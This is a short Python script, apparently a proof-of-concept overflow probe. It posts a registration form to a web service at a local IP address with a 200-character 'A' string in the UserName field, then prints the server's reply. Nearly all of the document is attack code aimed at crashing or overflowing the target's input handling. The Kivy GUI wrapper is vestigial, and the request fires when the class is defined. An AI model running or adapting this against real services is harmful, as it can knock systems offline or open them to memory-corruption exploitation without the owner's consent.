#!/usr/bin/python3
import requests
import kivy
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
OVERFLOW = "A" * 200

class MyApp(GridLayout):
    target_url="https://192.168.1.7/registresult.html"
    payload = {'UserName': OVERFLOW,
    'Password': 'AAAAA',
    'Password1': 'AAAAA',
    'Sex': '2',
    'Email': '@',
    'Icon': '0.gif',
    'Resume': '',
    'cw': '1',
    'RoomID': '<!--$RoomID-->',
    'RepUserName': '<!--$UserName-->',
    'submit1': 'Register'}
    #make http requests
    r = requests.post(url=target_url, data=payload)
    #print http responce
    print("This is all we got on target.", r.text)

class HttpRepeater(App):
    def build(self):
        return MyApp() 

if __name__ == '__main__':
    HttpRepeater().run()